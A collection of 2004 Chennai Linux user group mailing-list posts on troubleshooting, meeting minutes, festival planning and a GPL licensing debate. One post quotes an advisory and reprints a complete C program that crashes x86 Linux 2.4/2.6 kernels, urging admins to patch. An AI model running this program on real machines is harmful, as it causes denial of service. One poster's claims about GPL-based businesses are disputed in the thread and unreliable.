port. If the modem has USB you need to get the Linux
drivers for it. Setup is like this:

Internet<-->Modem(USB)<-->(USB)Linux PC

Otherwise you can directly connect with the Ethernet
port as long as you have your ethernet working on
Linux (In general, ethernet driver support is better
than USB support on Linux). Setup is like this:

Internet<-->Modem(Ethernet)<-->(Ethernet)PC

Moreover, with ethernet port on modem, you can connect
it to a router. 

Internet<-->Modem(Ethernet)<-->(Ethernet)Router<-->LAN

Message-ID: <002a01c45161$fd197c80$f922e2dc@j4e4a9>

Hi All

I am using a box with Win98/ RH9 / MDK10.0 (CE)  powered by Celeron 900 MHz
, 128 MB RAM, 40 GB HDD.

I was using KPPP to connect to VSNL / ETH to connect to  net right from RH
6.1 onwards. Suddenly for the past 10 days KPPP will not establish
successful internet connection.

It will terminate with pppd error code 16 or 19 during various trials. Fed
up with it I started configuring wvdial to connect to net. It was
establishing successful net connection and I was browsing net and sending
emails.

But now that also has stopped. I am giving below the output.
--------------------------------

-----------------------------------
usually after this when i run fetchmail it will retrieve my emails , but not
this time , the output below:
--------------------------------------------------------
[srikanth@localhost srikanth]$ fetchmail -u srikanthns -p pop3 mail.vsnl.com
Enter password for srikanthns@mail.vsnl.com:
fetchmail: couldn't find canonical DNS name of mail.vsnl.com
fetchmail: Query status=11 (DNS)
---------------------------------------------------------

Thinking that all ends are closed, I uninstalled kdenetwork by
rpm -e command, re installed it with rpm -ivh command.

Again I tried connecting through KPPP, it will go upto handshake
but then it will hang and time out will occurr and pppd will die, output
below:

-------------------------------------------

What else is to be done? my modem is connected to COM2
port.(GVC 33.6 Kbps).

I do have a Reliance FWP and its data cable is connected to
COM1 port and it functions well in Win / RH9 also.

The same KPPP works well in MDK10.0

Can anybody point out what mistake I am committing ?
Pl help.

Hi,

Sorry about the temporary glitch at ilugc.  The hardware was upgraded

In FC2, under images directory, you have two files; boot.iso and 
diskboot.img (Note that not bootdisk.img).

* boot.iso is to make a minimal bootable installation CD. To create the 
CD, do the following.

# cdrecord -v -eject dev=ATAPI:0,0,0 speed=24 driveropts=burnfree 
/path-to-image/boot.iso

Note: If you use SCSI emulation;it should dev=0,0,0 (or whatever is your 
device number; do a cdrecord -scanbus)

* diskboot.img is *NOT* for floppy or CDs anymore. It is for USB storage 
devices. A quote from FC2 release note would help.

<quote>
For systems capable of booting from a USB device, Fedora Core 2 includes 
an image file designed for use with USB pen drives (or other bootable 
media with a capacity larger than a diskette drive). The file is 
diskboot.img, and is present in the images/ directory on CD-ROM 1. Use 
the dd command to write the image.

Note
The ability to use this image file with a USB pen drive depends on the 
ability of your system's BIOS to boot from a USB device.
</quote>

PS: If you want to do a network install, why you take pain of creating a 
seperate disk? Just say 'linux askmethod' at the installation boot 
prompt. It will prompt you the method that should be used for the 
install (CDROM, Hard disk, NFS, HTTP, etc).

HTH.

Do you have a domain name or you want to setup DNS as cache-only.

This link will help you a lot.

As i understand, for the problem that you have you can configure Squid 
in your server.

Message-ID: <20040617055758.11392.qmail@web8001.mail.in.yahoo.com>

Minutes of ILUGC meet on 12th June 2004

     The meet started as usual about 30 minutes late at 3.30pm.

TECH TALK:

Mr.Bharati  started  first  session   with  lecture  on  advanced
programming.  This will  be a  series of  lectures and  today the
first.

     The  first and  most  important part  of programming  namely
accepting command  line arguments and  parsing them was  taken up
for  discussion. All  of us  would have  experienced the  pain of
parsing command  line options,  validating the arguments  etc. To
ease this there is a nice function called getopt.

    getopt_long function returns the command line argument parsed
one at  a time. It  returns -1  after parsing all  arguments. The
returned structure has form like

      name   is the name of the long option.

       has_arg
              is:  no_argument (or 0) if the option does not take
              an argument, required_argument (or 1) if the option
              requires  an  argument, or optional_argument (or 2)
              if the option takes an optional argument.

       flag   specifies how  results  are  returned  for  a  long
              option.    

       val    is  the  value to return, or to load into the vari?
              able pointed to by flag.

      A loop constructor like while and switch statements can be
combined to process the arguments like
       while (1) {
		c= = getopt_long (argc, argv, "abc:d:012",
                        long_options, &option_index);
               if (c == -1)
                   break;

               switch (c) {
               case 0:
                 printf ("option %s",
long_options[option_index].name);
                   if (optarg)
                       printf (" with arg %s", optarg);
                   printf ("\n");
                   break;
                 .....
                 .....
                  }
	}

       
       With getopt Bharati chose to end the session promising more
stuff in following meets.

DISCUSSION

       Next  free  discussions  started. Raman  started  a  small
discussion on  swap based on the  what went on in  kernel mailing
list and slashdot.org. He said there are differing opinions about
swap required or not, whether it  helps in speedup or slows down,
what should be the size of  swap - religiously correct figure 2 x
RAM ?.

Almost all  participant accepted that  it depends on the  type of
work done. In fact most have not seen swap being used at all. One
more  opinion is  less  used  pages of  large  programme will  be
swapped out  thus making room  for active programmes  and buffers
making the  system throughput better. Raja  explained the working
of virtual  memory system  and how  swap takes  place and  how we
specifically  tune to  swap  out portions  of  kernel itself,  to
improve the performance.

QUESTION TIME

      Next it was question time.  Ankit from Vellore Institute of
Tech Vellore [we  should thank him and his friends  for coming to
the  meet  all the  way  from  vellore],  said is  apache  though
running,  opening  the pages  through  any  browser returns  only
error. His box is not  on any network, its just http://localhost,
and returns unable  to open the page. He earlier  had squid proxy
running, when  things were  fine. He knocked  off squid  and from
that time  onwards he is  getting this  problem. He was  asked to
checkup a.What is in httpd log.  b. Try telnet to port 80. c.Look
out for permissions on http root  directories. If any one has any
clue please post in the list.

      Karthik  from TCS  raised  few  doubts regarding  mounting,
whether whole tree will be loaded  or just root directory and how
linux file system stores the data  - contiguous or not, where the
next page link information will be stored etc. Most of his doubts
were clarified.

ILUGC RELATED ISSUES-LINUX FESTIVAL

      After question  time, the discussion was  about forthcoming
install fest. First agreed change was to call the event as 'Linux
Festival' to cover both installation and demonstration. Thanks to
Raja's effort  Asan Memorial school  in Egmore agreed  to provide
the place. The  date is tentative fixed for 10  and 11th July. If
the venue is  engaged then it will  be on 17 and  18th July (both
dates Sat & Sun).

Raja will confirm the date in few days on the mailing list. 

      The format of the festival will be 

      a. An installation, followed by demonstration of software,
         setting modem up etc on a projector in Auditorium. This will
         about one hour duration. This will be repeated 3 or 4 times 
         whose starting time will be fixed previously and 
         prominently announced.

      b. There will be additional computers with volunteers, where 
         further information/discussion can take place

      c. People can bring their computers, on which volunteers will
         install. The distro will be left to volunteers to decide
         based on the type of user (and volunteers experience).

      d. CD's will be burnt and sold for nominal fee to be decided 
         later.

      f. If some volunteer(s) is(are) willing,  T-shirt business will
         be taken up.

      g. Funds: We have some fund left from last LDD, which may not
         be sufficient. After assessing the expenditure list will 
         be posted with requirements if any.

     It  is also  decided  to  have a  meet  next Saturday  about
the  Festival. This  meet  is  for volunteers  and  not for  tech
talk/discussion.

     At present  there are only  5 or 6 confirmed  volunteers. As
more people are required mailing list  will be posted with such a
request.

     Mr.Bharati expressed his difficulty  in continuing to be the
co-ordinator. This will be takenup in the list separately so that
proper thread is created in the list and discussed.

General:
         The attendance was 19 [ unfortunately the attendance was
not taken]. There were 2 new entrants.

         We are planning to stick to the present format of meeting
namely : 1.Tech Talk  2.Free Discussion 3.Question time
4.ILUGC Organisational matters. Comments & suggestions welcome.

Raman.P

hi group,

don't know why this new didn't make much noise. a small C code, which 
when compiled and run crashes the kernel. i tried to copile and run this
over ssh, and it crashed my ssh session as well as the ssh server.

admins make sure you apply the proper patches.

http://reviewed.homelinux.org/news/2004-06-11_kernel_crash/index.html.en

<FROM THE WEBSITE>

New Kernel Crash-Exploit discovered
Published 2004-06-11 by xiando, v2.3.0, last updated 2004-06-15.

A bug lets a simple C program crash the Linux kernel, effectively locking 
the whole system. Affects both 2.4.2x and 2.6.x kernels on the x86 
architecture. 


The kernel is the most important part of the Linux operating system. 
It handles communication with the computers hardware and decides the 
priority of running programs (processes). If the kernels stops doing 
it's job, everything else will too. 


The Evil Code
Running this simple C program crashes the Linux kernel. 

crash.c.txt 


  #include <sys/time.h>
  #include <signal.h>
  #include <unistd.h>
  
  static void Handler(int ignore)
  {
   char fpubuf[108];
   __asm__ __volatile__ ("fsave %0\n" : : "m"(fpubuf));
   write(2, "*", 1);
   __asm__ __volatile__ ("frstor %0\n" : : "m"(fpubuf));
  }
  
  int main(int argc, char *argv[])
  {
   struct itimerval spec;
   signal(SIGALRM, Handler);
   spec.it_interval.tv_sec=0;
   spec.it_interval.tv_usec=100;
   spec.it_value.tv_sec=0;
   spec.it_value.tv_usec=100;
   setitimer(ITIMER_REAL, &spec, NULL);
   while(1)
    write(1, ".", 1);
  
   return 0;
  }
  
  
This bug is confirmed to be present when the code is compiled with GCC 
version 2.96, 3.0, 3.1, 3.2, 3.3 and 3.3.2 and used on Linux kernel 
versions 2.4.2x and 2.6.x on x86 and amd64 systems.

Hello Friends

Please help in me in solving these problems:

1.How do i create an user defined signal in Unix/Linux?

2. After Creation of user defined signal (Assume Ctrl + A) . Assume There
are 2 processes running Process A and Process B. Now this user defined
signal (Ctrl + A) should be triggered automatically (by some
mechanism....... example..completion of a loop) so once this signal gets
triggered. This signal should be redirected to Process B.

How do i solve the above problems.

Kindly help me .

Thanks in advance

Regards
Balaji

Ctrl + A is NOT a signal. But you can genate a signal

I am not very sure how to create user defined signal what U have asked.But looking at the purpose what U are trying I would suggest you to use semaphores, if it is in kernel space , U can use kernel semaphores in a much easier way.

Subject: [Ilugc] simple software for billing
Message-ID: <20040618183325.20426.qmail@web10905.mail.yahoo.com>


I'm now helping a departmental store to migrate to
GNU/Linux from Windows 98.  I installed Mdk-10.0.  The
original billing software works in DOS box in Windows
quite well.  I tried wine, but it fails.  Then I
downloaded dosemu, which worked perfectly. The
software is now working perfectly under linux--but the
problem is the when tring to print the bill through
software it's giving some error like ..
  
 print error: client-error-code .. something like
that.

So I searched for simple software that does this ..
should allow entry of new products (id, maxprice,
price) and should print bills by entering product id,
quantity.  That's all.  I though of writing that app.
myself, but very busy these days.  Searched freshmeat,
sf, google--all of them are quite big and complex.  Do
you think of any software.

Also the original software was written in
FoxProx/dBase--though I can convert the dBase data to
MySQL tables.

Any suggestions?

I live in Pondicherry. Satyam has just come to town with their broadband
offer. I was wondering if they are truly linux-friendly. They say so but
you never know, they wanted give us a connection via "satellite"
(lol)... so just checking if the guy got the linux part right at least.

I'm thinking of going in for the unlimited-but-shared package. I will
have to sacrifice some speed for loads of data. Rs.800 per month for 1
GB , and Rs.1000 per month for an unlimited transfer. I just wanted to
also check how their performance is with this offer. is it extremely
slow, or manageable?

I'm sorry about the delays.  The procedure for booking the Asan school
venu is a tad more complex than I had originally imagined.  Howver, I
think the dates - July 10,11 and 17,18 are free and I should be able to

You call it satyam but it is sify rather. And yes they are linux

Infact it is more linux than win(the development i mean).

Presently most of the OS supporting the Unicode. So no major
work needed to support any local languages. But for Indian
languages still we are in-need of good rendering engine,
more keyboard layout support and more encoding support etc
and utilities like spell check, language converters,
search engine etc...

So you have no. of research topics for ur PhD.

Worthy from the point of view of corporate hiring. ( How else do you say 'I have x years of linux experience' in an interview? without being ignored. Involving in open source projects is one way.)

I googled one( http://www.lpi.org ). But how worthy/useful are these.
Can anyone share their experience.

Hi

This is a linux news room. You are asking for windows programming too. 
Hmm. Parallel line meet at infinity.

Can we all know what's the project which involves so much like C, C++, 
Java, PHP, MySQL, Linux and Windows Programming.

Thanking you
T.Ullas

Hi,

I was trying to compile and load the usb-skeleton.c
present in the drivers source. It compiled fine (after
making the reqd changes in version.h and irq.h). but,
when loading it gave the following oops. I googled for
a possible solution but came up with none. Anyone
faced a similar situation. What am i missing here.

If a person uses Linux, is it assumed that he doesn't know anything 
about Windows programming? I personally work on both. What about GNUWin 
project? Tons of GPL applications for Windows... Who does it all?

That is his requirement. He clearly notified that it was commercial in

I'd agree with Praveen, only difference being that if this was blug, you
would have Mr Atul Chitnis taking off on whoever posted for a windows
requirement.

I think the argument mentioned by praveen is also important.

Well, thank god it's not BLUG.  What the guy wanted was Linux developers 
who were also familiar with windows APIs / coding .. and you'll need 
these skills given that it's quite common for windows and linux apps to 
be tightly integrated with each other, in several setups ...

Try http://rolodap.sourceforge.net/ - it is LDAP but well, it's a bit 
easier than writing the schemas yourself.

Subject: [Ilugc] A strange problem
Message-ID: <cb6uo0$shl$1@sea.gmane.org>

I have a linux server with 2Mbps connection and around hundred clients 
in different browsing centres(no need to say all are windows clients, 
mostly win'98).

All the clients are in the same subnet and the network was ok to start with.

Problem1: in windows network neighbourhood i can see all clients. i want 
to disable this so that one system's in one browsing centre shouldn't 
access other's system.

if i do subnetting i need to divide them into 10 subnets and assign them 
to go a single NIC. is there any possibility for this?

Problem2: some of the clients work normally. After a some time(say 
10min) they are totally disconnected from the network, until restarted.

Any pointers or suggestions appreciated.

thanks,
SK

That is usually how it is. you fetch mail from a dozen pop3 servers,
but deliver your mail to a single smtp server which again distributes
it to the destinations. Usually this single smtp server is the ISP's
SMTP server.

Cheers,
Joe

You can add multiple smtp servers.

Then you can go to "server settings" under each account, and click 
"advanced". You get a tab for smtp settings where you can choose from a 
drop down list of the smtp servers that you have defined.

  I get this error when sending through `mail.spymac.com`

Maybe they require smtp auth so you have to set up your profile for smtp 
with your spymac login and password.

Yes, that's what I did before.  Moreover, thunderbird didn't ask for

  Without asking for password, it delivers mail to spymac accounts - 
other accounts are not delived ``relaying denied`` ??
 
 I'm still confused .. where can I find info about ISP's SMTP server 
(which allows relaying) -- btw I'm using sancharnet (an unreliable 
windows server at their end)

Correct.  Relaying = when you try to send mail from any random IP, 
through spymac's server, to any random email address that's not on 
spymac's system

you typically ask your isp, or try something like mail.that-isp.com or 
smtp.that-isp.com to see if it works.

You can remove the windows file sharing protocol from each client.

Do u have any linux server as gateway or for Masquarading them..??

It seems NIC or cable problem if the systems are virus free. Pls make sure
the system is working fine without the  ethernet cable connected.

If i remove file sharing then clients in one browsing centre won't be 
able to access other clients in the same centre.

Linux server works as the gateway and MASQ them all with the following 
two rules.

iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD -i 192.168.0.1 -j ACCEPT

Also it is running squid and clients use the http cache of the squid.

I doubt this is because of virus. At the beginning those clients work 
well. After sometime they are totally disconnected from the network.

One more problem is that in one browsing centre there are 10 clients all 
in the same subnet and connected to the server. In that only 7 systems 
work. 3 won't work. But if disconnect or bring down some the working 
machines the other 3 systems start working. I doubt there may be 
something wrong in the squid.

But to my even ping doesn't work. AFAIK squid can only limit the number 
of http hits/cache hits. how is it blocking ping. No other rules in 
iptables.

I am totally confused. please help me.

Hi All.

I am having a peculiar error with apache. httpd starts up and stops successfully during start up and reboot.

But when i make a request for http://localhost Galeon reports that www.google.com could not be found. For http://127.0.0.1 and http://localhost.localdomain The error reported is that the connection was refused.

Mozilla does not report any error and remains blank.

I used to do some LAMP(PHP) programming without any prob till a month back. Here are Apache error logs. 

This is the file ssl_error_log.There were more files with the same name and numeric extensions.

Hi

As an aside look at this site. You can create your own bootable cd 
distribution.

Topic totally drifts away.

I think that Babu downloaded the Fedora Core 2 ISOs from the Internet. 
If it is so, use Nero (Windows) or cdrecord (*NIX) to burn your cds.

Nero:
Select "Burn Image" and choose the ISO image and burn it.

cdrecord:
cdrecord -v -eject dev=ATAPI:x,x,x speed=48 driveropts=burnfree 
/path-to-image/image-name.iso ( For direct IDE writing)

cdrecord -v -eject dev=x,x,x speed=48 driveropts=burnfree 
/path-to-image/image-name.iso ( For direct SCSI emulated writing)

PS: You need not take any special care for bootable CDs if you are 
writing the CD from ISO image as the image itself contains the boot 
information.

Hi,

I am thinking of migrating entirely to linux , when i run kppp from other
than root its telling the prog req root previliges and asks for the root
password, but when i checked for the kppp permission in /usr/bin ,read and
exec access is given to all groups , now how to access permissions in order
to solve this prob so that other users can access it without giving the root
password...........

another thing is that how to give access to other users for particular
programs or apps alone , for eg the redhat update manager ( the yum ) req
root previliges , but for a particular user i need to relax it , where to
grant permissions in order to do this.....

The problem  here is not the  permissions of the  executable.  Its the
group /  user as which  pppd wants to  run.  On debian, this  group is
called 'dip'.  So adding a user to that group will let him run pppd.

You can  setuid root  the executable, but  instead giving sudo  to the
user is a much more cleaner / safer way.

pass the option 'init=/bin/bash' to the kernel while booting. You will

man  uname  and  find  out  what  uname  stands  for.   its  not  your

you can do it... one is to simply type 'echo venu' at the prompt. ;)

No single line answer for this Q. Goto kernel.org site and

I found that you have CCed your mail to LUG Goa as well. Please avoid 
doing so because, reply all will include LUG Goa list's email as well

This is because evolution runs some  sort of an alarm thing. if you do

running. Killing it will do the job.

The uname utility I guess would inturn call the uname function.
I think the uname function is a syscall, going though the glibc
Code should confirm that.
In the file /usr/include/linux/uts.h
(/lib/modules/`uname -r`/build/include/linux/uts.h),
the following can be found.

/*
 * Defines for what uname() should return
 */
#ifndef UTS_SYSNAME
#define UTS_SYSNAME "Linux"
#endif

I feel that changing this entry and recompiling the kernel should work.
HTH,
Gopu.

I think Gopu is right. Some article is available at

Fedora has these problems and Mandrake is very buggy -- Nothing suits
newbies yet.  This has to change, probably with Gentoo (There are
projects like installer, etc .. going now)

MP3  has  patent  issues.   Use  OGG  Vorbis  <http://www.vorbis.com/>
instead. XMMS has  ogg vorbis input plugins and  should work just fine
(except the  equalizer which does  not work with  OGGs -- but  you can
always go find a "decent" hardware equalizer from ritchie street ;) )

Hello All,

Asan Memorial School is available on the 10,11 July for the Linux Fest.
The next weekend (16,17 July) is definitely not available. 

I have already sent two letters on behalf of chennai lug to Asan.  I
have received *verbal conformation* regarding of the above dates, but
I'm still waiting for a official statement (which could take 1-2 days
time).

I will inform everyone as soon as I receive a letter from Asan.

Message-ID: <1088010747.9132.10.camel@god.box.in>

I'm currently a dial-up user and am plannning to get a BSNL DIAS
connection. I'm also very keen to move to Gentoo. I was just wondering
if there were any users of Gentoo on a similar data-restricted
connection. How much data is used up during a stage 1 install containing
Gnome 2.6 and a few other basic stuff like evolution...

Woudl it be recommended that I do a stage 3 and then just update? How
much data transfer would that take? The reason im taking broadband is so
that i can emerge stuff.

I did a Gentoo stage-3 install from the Net on
broadband (when in the US at 240 KB/sec). It took 17
hours (base, xfree and KDE). It was cool though :)

Installation documentation:
http://www.geocities.com/shakthimaan/gentoofreebsd.html

(Stage-1 would have taken me atleast 4 days)

Now using BSNL DIAS in India (at 10 KB/sec max) for my
"emerge" stuff and updates. 512 download/upload limit
per month. It is pretty good for updates. Something
better than VSNL dial-up. 

If your ethernet is detected by 2004.1 then you can
use the Internet to install Gentoo, I guess. But, I
would recommend you do a stage-3 install from the CD
and then update your system. I only install new
packages, not update the system often. But, may have
to "emerge sync" and "emerge -uDav world" sometime
soon.

I have BSNL 2nd bfone (permanent telephone line with flat rate of Rs.
500 per month, regardless of no. of hrs. usage).  With the free
surfing hours provided by the leading ISPs, you could download almost
3 GB per month just by spending Rs. 500 per month.

I did a stage3 install.  After that it may not take more than 2 nights
for a world update.  Excluding OpenOffice, it may take a day to
compile them.

Hello Babu,

Do not specify the ethernet settings it is not needed

simply,

iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 3128

will do.

I don't know what you mean by 1% Visibility. Anyway the
simple solution is, just remove the .gnome dir and other
related dir from the user's home dir and login again.

Message-ID: <20040624064803.35810.qmail@web50202.mail.yahoo.com>

Greetings!

Is anyone planning to sell t-shirts during the Linux
Festival?

There is a good friend of mine named Mr. Manohar (at
Joshua's) who deals with t-shirts (sale of t-shirts
only in bulk quantities). He can also get printed
t-shirts if we give the design. The cost of each
t-shirt depends on the material. I shall have a look
at the store and give you a rough estimate for the
cost per t-shirt. 

We need to tell him atleast 4 days in advance to get
about 100 t-shirts printed. How many do we need? Is
there any Treasurer or Coordinator who can help with
the finances? Please let me know. If no one else is
getting t-shirts, I can try and arrange from here. 

Feel free to post or send any designs. My idea is to
have a small Linux logo in the front side and Linux
quotes/slogans in the back of the t-shirt.

Let me know your views,

Thanks,

Shaks

FreshRPMS and NewRPMS provide a lot of packages that are missing in 
Fedora like xmms-mp3, mplayer, xine, flash-plugin, etc...

http://ftp.freshrpms.net/pub/freshrpms/fedora/linux/2/
http://newrpms.sunsite.dk/apt/redhat/en/i386/fc2/RPMS.newrpms/

You will be getting answers for most of the Fedora questions at 
http://www.fedorafaq.org/

I personally am comforatable with FC2 so far. Use apt and yum and you 
will not feel missing anything.

   Yes, but it's dialup.  For about 4 KBps you could download about
100MB from 11pm to 8am during which your ISP account usage hours won't
count.  So effectively you're paying Rs. 500 per month and downloading
about 3GB!

  In this case it is connectionless and a little greater speed.  But
in dialup there is not limit of download/upload.

I too think that laying over-emphasis on being anti-MS when there is so much things good to speak about linux, is in a way deviating. Particularly, when most of the people, who are new to linux find it harder; the anti-MS attitiude is just the thing that will turn them anti-Linux and make them move back to MS, cause what the heck, all they could see around was people blaming MS, which they cant at the moment associate themselves with. So the natural and easiest way for them is to ignore the whole bunch of guys blaming MS. Well I have seen this happen and i cant quite blame them.

So as linus says.. let it be a totally unintentional side-effect. We dont have to focus our energies on attacking MS. Putting our energies in improving Linux does a lot more damage.

GRUB is overwritten by Windows XP. Do the following steps to recover 
your GRUB.

* Boot with the RedHat 9 first CD and type 'linux rescue' in the boot 
prompt. The installer (anaconda) will mount your RedHat installation 
under /mnt/sysimage.

* Type 'chroot /mnt/sysimage' in the rescue shell that you get.

* Open '/boot/grub/menu.lst' in your favourite editor and add the 
following lines to the end it it.

title Microsoft Windows XP
	rootnoverify (hd0,0)
	makeactive
	chainloader +1

Note: I assumed you installed Windows to hda1. If you have doubt do 
'fdisk -l /dev/hda' to find the your C:
hda1 -> (hd0,0)
hda2 -> (hd0,1)
and so on.

* Then type 'grub-install /dev/hda'. It will report that installation of 
GRUB completed.

* Reboot using 'reboot' command and you will be getting GRUB with two 
entries one for Linux and other for Windows.

HTH.

Hi folks!

Thanks for your inputs. I think we can make it a
design t-shirt. Attached is version 1.2 (both .sxd and
.pdf). 

Here are the details regarding printing the t-shirt:

- There are two types of white t-shirts: thin (Rs.45)
and thick (Rs.65). The thin is quite translucent and
may wear out soon. The thick is preferrable.

- Sizes come in M, L, XL. No price difference between
them.

- With the above design, the cost of one t-shirt with
printing will come to Rs.100-Rs.110 atleast (quite
expensive?).

- Atleast 100 t-shirts must be printed. We must pay
advance of 50% of the total amount for work to start.

- Will take him 7 days to finish the work. Work will
start as soon as advance amount is paid

- Colored t-shirts start at Rs.75/-. I feel white is
preferrable.

Contact address:

Tel: 28520260

---------------

If you feel Rs.110/- per t-shirt is expensive there is
another alternative :) 

We can either make our own t-shirts or ask people to
bring their t-shirts and we can paint on them.
Template s can be made on cardboard. There is fabric
paint available. 

Let me know your views,

Thanks,

Shaks

    You can also create a seperate group, chgrp that executable to
that group and do a chmod g+s on that executable.  Only user's on that
group would be able to run that program as root.  (You may also want
to look at SELinux - 4th CD of Fedora Core 2, I think)

any problem. But my yahoo mails (pop.mail.yahoo.com) are not getting
downloaded. I am getting the following error message. I am sure someone in
the group might be using fastmail.fm account with evolution. Kindly help me
to solve the problem.

This was already discussed before. Take a look at the archives.

There could be 2-3 different reasons. But the most likely one is some virus 
affected windows machine (among those 100's) that is doing a portscan or a 
ping sweep.

Try doing a 'tcpdump -nn -v -v -i eth0' on the gateway to see if there is too 
much arp/icmp traffic.

You could use a userspace 'arp daemon' to fix this(on your gateway) in most 
cases.

Hello All

it is not my intention to flame the list
but this list will be the appropriate place for this question.

i'am doing a research project on various licensing models available ( opensource gpl freebsd licence, windows eula etc ) and the computer indistry.

of all these i find the open soucre / gpl used by certail OSes like linux looks scary and may finally have an impact on industry.

could you kindly let me know on what is the objective / intention of this licensing policy ( which i feel nobody will benefit )
enduser, developers, companies etc.

-kamban.

 This looks like a bug with gmail (some mails are not actually quoted

I personaly feel that you do not have a clear understanding of any of 
the Free Licences. Please do take a *DETAILED* look at GPL or any other 
free licenses before you claim that it is of no use to anybody.

Hello praveen / all

I'am sorry id it had hurt the list .
I take back my word " which i feel nobody will benefit "

Could you kondly give me some points, how the software / other industry can grow using gpl ?

if i use gpl, i'm forced to release the source to everyone.
so my effort in adding the compnents goes waste as my code also is now bound by gpl.

could you please correct if i'am wrong by giving an example ?

Regards
kamban

Hi all,

    I am using Red Hat linux 9.0. My problem When I
works on xwindows and the consol terminal seperately
both works well. But after logging in to the xwindows
(CTL + ALT +f7)

and if I switch to any of the console terminal (CTL +
ALT + 1-6) The xwindow crahes and reboots and I get
the following messages in the console terminal which I
tried to open.

But that's true! I'm a nobody. I have benefited from the GPL! And
I have no doubt I will continue to enjoy the benefits :)

Any final thoughts? Someone kindly confirm the venue,

That's completely untrue. Just shows you haven't even read the GPL.

Google uses (a lot of) GPL software. But they don't have to release their 
source. They have recently announced that they will be releasing some of
their code, but that's by choice, not because they were *forced* to.

Only if you distribute binaries are you forced to release the corresponding
source code.

Please go read up and get a basic understanding of the GPL before you
assume that it is useless or whatever.

Redhat/IBM etc. have built up billion dollar businesses involving GPL'd
software. I think you'll agree that they are part of the software industry.

hi pals,
i got that working. but i should change the user directory permission to 711
eg. bala and public_html to 755.

after that only it works. is there any problem would arise in security if i
give execute permission to all in my directory???

my opinion is that


i can say one thing. Releasing code along with the software faciliates the
enduser inorder to customize the software for his own flexibility.

you develop software. for whom u develop it??? its for u or for some other
people??

if its for other people every time they would come and pay u for the
binary?? u want that??

under this FSF, the main aim to not to make money. software should be
available to all along with source code so that developer can study, learn
add some more features to your components which u may not have in mind.
that's how linux kernel is developed.

remember most of the corporates are now depending on the linux kernel which
was contributed by large no. of developers which adds many features to it.

Even if Linus torvolds got the copyright of the kernel he developed,  that
linux OS would not have reached its popularity. he may not aware of all the
features in it at present which is added by variety of developers.

so releasing the software under GPL is good since it would add more feature
to your software development by variety of developers around the world and
if it is suited for the corporates, they will definitely take it for their
use.

  Post the output of `mount`.  Also try disabling supermount (or submount).

      Welcome to Software Freedom Day Online!

*On August 28, 2004, we will celebrate the first annual Software Freedom
Day.* On that day, we will make the world aware of the virtues of Free and
Open Source Software (FOSS), and encourage its widespread use. We will set
up stations in public places to give away informational fliers and CDs with
selected FOSS, including TheOpenCD <http://theopencd.sunsite.dk/> and a
special all-free version of Knoppix <http://www.knoppix.net/>.

This is a global grassroots marketing campaign in which we are inviting
volunteers from around the world to participate. It will be up to the
individual teams to chose how they wish to organize their local PR efforts.
We will assist with bulk production of supplies, though the cost of supplies
must be distributed.

Check our team pages to see if there is already a team near you,
<http://softwarefreedomday.org/wiki/index.php/Team_Pages> or use this form
<http://www.softwarefreedomday.org/staticpages/index.php/TLSignup> to sign
up to start one. 

We also have a forum <http://www.softwarefreedomday.org/forum/index.php> and
mailing lists to help you stay informed. We hope you will join the
celebration!
<http://www.softwarefreedomday.org/staticpages/index.php/mailinglists>

We have set up a wiki
<http://softwarefreedomday.org/wiki/index.php/Main_Page> that will contain
all the team pages so that team members can set up and maintain their own
information. Matt has made a team sign-up page
<http://www.softwarefreedomday.org/staticpages/index.php/TLSignup> where new
team leaders can register their team and provide contact information. We
would ask that even established teams take a moment to fill in this form so
we have some standard contact information on all the teams.

We have now settled on an official approach for the supplies we will provide
to teams Software Freedom Day. We have always felt that it is important to
have a professional appearance on the items that we give to the public, so
we decided early on to help the SFD teams attain such professional quality
materials. The exact form this would take has evolved during the planning
process, and we can now present this year's for provision of the materials.

 *"Free Software Flooding" in Macedonia* 
<http://www.softwarefreedomday.org/users.php?mode=profile&uid=6>

<http://www.softwarefreedomday.org/index.php?topic=General>Free/Libre
Software Macedonia <http://www.freesoftware.org.mk/> have recently
distributed 1000 CDs, half and half TheOpenCD and Knoppix, to help promote
FLOSS. Here's the trick, the event was held outside the conference hall, in
Skopje, where Microsoft's "Vizija" (Vision) conference was taking place, in

I assume that, you want to determine wether you 
have compiled any modules in your kernel. This
you can determine by looking at the files in the
/lib/modules/<kernel_version>/kernel directory.
Otherwise running modconf will give you list 
of modules, if you have compiled any modules
in the kernel.

Well as Bharathi S wrote user 'mani' cant set his password to those
strings because passwd doesnt allow it ;). root can though - well root
can do any thing. So if mani needs to set his passwd use a long
password that is different from the old one..
if you really do wanta  small simple passwd, and dont expect others to
use your machine, get root to set it.

Indeed what you say is my conclusion too in my paper.
This is the exact point which i'am also inferring after doing a lot of study.
with GPL, you cannot make money.
Though they say a lot of things, there is no clear proof that companies based on opensource have been able to generate revenues, contribute to the growth of the industry and generate employment for engineers.

Big companies have started to sink due to GPL.
It's like a kind of dracula, don't mistake precisely that's the word we can use for GPL

Here are some cases.
(i) Sun Microsystems - initially tried to adopt GPL, later realised that it didn't work out and started to pull out 
    it's staroffice and made payable.

(ii) SCO - initially tried to be a Linux company by acquiring caldera, didn't work out so pulled out.

(iii)Novell is now experimenting by acquiring SuSE, let's see what happens.

(iv) Mandrake became bankrupt.

The fundamental thing is there is no revenue model when you try to build you software over an opensource.

RedHat/Mandrake not making money? Granted... Mandrake was in the red 
sometime back but they are back on track now.

If you cannot make money, why are IBM/Novell moving to open source in such 
a big way?

- Big companies have started to sink due to GPL.

Big companies have started to rise higher actually... And there is a 
difference between opensource and the GPL.

Have you actually used this word in you paper? :)

openoffice almost entirely funded by SUN. And staroffice is based on 
openoffice.

Java Desktop System?? Their own distro?

- (ii) SCO - initially tried to be a Linux company by acquiring caldera, didn't work out so pulled out.

Caldera acquired SCO! hehe... :)

Know your history! 

- (iv) Mandrake became bankrupt.

They've recovered.

And this is what you call research?

You have completely misunderstood my question .
To explain more clearly to you.

Let us a the open source community has built a product which has 20,000 lines of code.
and now what as a company i do is take this code and add more features / enhancements.
Now it becomes 30,000 lines of code.

I have invested some $36,000 for this.
what happens now is i need to release the 10,000 lines of code to the community which is a waste of my efforts.
Rather i will build the product from scratch instead of taking from open source.

People say you can develop it as a module ( in case of kernel mode ) and as a library incase of user mode.
Have these been proved anywhere.
Has Linus torvalds who the copyright owner of linux has comments on this ?
it totally depens on him ( an individual ) and he is to decide on this.

They are forced to do so.
every one knows Netware is not doing well.

IBM : they failed miserably by producing OS/2 and couldn't compete with Microsoft.
